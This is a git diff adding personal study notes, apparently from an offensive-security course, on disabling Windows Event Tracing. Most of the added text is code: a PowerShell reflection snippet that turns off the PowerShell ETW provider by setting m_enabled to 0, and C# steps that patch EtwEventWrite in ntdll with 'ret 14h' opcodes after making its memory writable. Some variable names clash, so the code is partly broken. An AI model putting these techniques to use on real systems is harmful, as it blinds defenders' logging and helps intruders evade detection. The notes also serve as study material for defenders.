@@ -45,3 +45,61 @@ Controller -> Patching EtwEventWrite, Runtime Tracing Tampering,
 Consumers -> Log Smashing, Log Tampering
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Inside .NET assembly - information about assembly contents - metadata
+.NET assembly: PSEtwLogProvider
+
+-obtain .NET assembly for PSEtwLogProvider
+$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
+
+-store a null value for etwProvider
+$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
+
+-set field for m_enabled to previously stored value
+[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
+
+-compile into one ps file
+-run other code
+
+-----------------------------------------------------------------------------------------------------------------------------
+
+Patching Tracing Function
+-ETW loaded from runtime of every new process - CLR (common language runtime)
+-can write pre-defined opcodes to an in-memory function to disable functionalities
+-LIFO - last in first out structure
+-ETW is written from the function EtwEventWrite
+
+-assembly ret 14h will end the function and return to previous application
+-steps: 
+1. obtain handle for EtwEventWrite
+var ntdll = Win32.LoadLibrary("ntdll.dll");
+var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");
+
+2. Modify Memory permissions of the function - flNewProtect - 0x40 enables X,R,RW
+uint oldProtect;
+Win32.VirtualProtect(
+	etwFunction, 
+	(UIntPtr)patch.Length, 
+	0x40, 
+	out oldProtect
+);
+
+3. Write opcode bytes to memory - Marshal.Copy to write opcode
+patch(new byte[] { 0xc2, 0x14, 0x00 });
+Marshal.Copy(
+	patch, 
+	0, 
+	etwEventSend, 
+	patch.Length
+);
+
+4. Reset memory permissions of the function
+VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect);
+
+5. Flush the instruction cache
+Win32.FlushInstructionCache(
+	etwFunction,
+	NULL
+);
+
+-----------------------------------------------------------------------------------------------------------
